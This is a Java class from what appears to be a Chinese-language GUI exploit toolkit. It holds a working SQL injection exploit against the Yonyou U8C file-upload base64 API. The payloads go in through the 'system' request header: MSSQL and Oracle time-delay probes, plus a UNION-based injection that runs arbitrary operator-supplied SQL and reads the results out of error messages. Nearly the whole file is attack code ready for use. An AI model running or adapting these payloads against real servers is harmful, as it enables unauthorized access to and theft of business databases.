package exp.oa.yongyou.u8c;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.HttpTools_getTime;
import utils.Response;

import java.util.HashMap;

public class yongyou_U8C_base64_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {

        return attcmd(url,cmd, textArea, textArea_cmd);
    }
    private static String base64_sqli(String url,String sql) {
        HashMap<String, String> head = new HashMap<>();
        head.put("Content-Type", "application/json");
        head.put("trantype", "pk");
        head.put("isEncrypt", "N");
        head.put("sign", "token");
        String mssql_sqli = "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL," + sql + ",NULL-- QIwq";
        head.put("system",mssql_sqli);
        Response res = HttpTools.post(url+"/u8cloud/api/file/upload/base64","",head,"utf-8");
        if(res.getCode()==200 && res.getText().contains("errormsg")){
            String msg = JSON.parseObject(res.getText()).get("errormsg").toString();
            String var1 = msg.substring(msg.indexOf("值")+2,msg.indexOf("转换")).replace("'","");
            return var1;
        }
        return null;
    }


    private static String[] base64_time(String url){
        String[] sb = new String[2];
        HashMap<String, String> head = new HashMap<>();
        head.put("Content-Type","application/json");
        head.put("trantype","pk");
        head.put("isEncrypt","N");
        head.put("sign","token");
        String mssql_i = "1';WAITFOR DELAY '0:0:4'--'";
        String oracle_i = "1' AND 6454=DBMS_PIPE.RECEIVE_MESSAGE(CHR(75)||CHR(84)||CHR(65)||CHR(112),4)-- sfce";
        head.put("system",mssql_i);
        long t = HttpTools_getTime.post(url+"/u8cloud/api/file/upload/base64","",head,"utf-8");
        if(t>3000){
            sb[0] = t+"";
            sb[1] = mssql_i;
            return sb;
        }else{
            head.put("system",oracle_i);
            long t1 = HttpTools_getTime.post(url+"/u8cloud/api/file/upload/base64","",head,"utf-8");
            if(t1>3000){
                sb[0] = t+"";
                sb[1] = oracle_i;
                return sb;
            }
        }
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            String[] sb = base64_time(url);
            long var = Integer.parseInt(sb[0]);
            if (var>3000) {
                Platform.runLater(() -> {
//                    textArea.appendText("\n 漏洞存在 输入cmd开始构造回显");
                    textArea.appendText("\n [ yongyou_U8C_base64_sqli ]");
                    textArea.appendText("\n (1) 延时注入");
                    textArea.appendText("\n (2) 联合注入,CMD处输入sql语句执行");
                    textArea.appendText("\n");
                });

                String target_req =  "POST /u8cloud/api/file/upload/base64 HTTP/1.1\n" +
                        "Host: "+ url.substring(url.indexOf("://")+3)+"\n" +
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0\n" +
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n" +
                        "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n" +
                        "Accept-Encoding: gzip, deflate\n" +
                        "Connection: close\n" +
                        "Upgrade-Insecure-Requests: 1\n" +
                        "Content-Type: application/json\n" +
                        "isEncrypt: N\n" +
                        "sign: token\n" +
                        "system: "+sb[1] +
                        "\ntrantype: pk\n"+
                        "Content-Length: 857\n";
                Platform.runLater(() -> {
                    textArea_cmd.appendText("\n----------------------------------------------------------------------\n"+
                            target_req +
                            "\n----------------------------------------------------------------------\n"+
                            "\n延时时间: "+var+"毫秒\n----------------------------------------------------------------------\n"
                    );
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    private Boolean attcmd(String url,String sql, TextArea textArea, TextArea textArea_cmd) {
        try {
            String var = base64_sqli(url,sql);
            if (var!=null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n SQL语句: "+sql);
                    textArea_cmd.appendText(var +"\n");
                    textArea.appendText("\n");
                });

                return true;
            }else {
                Platform.runLater(() -> {
                    textArea.appendText("\n SQL语句: "+sql+" 执行失败");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
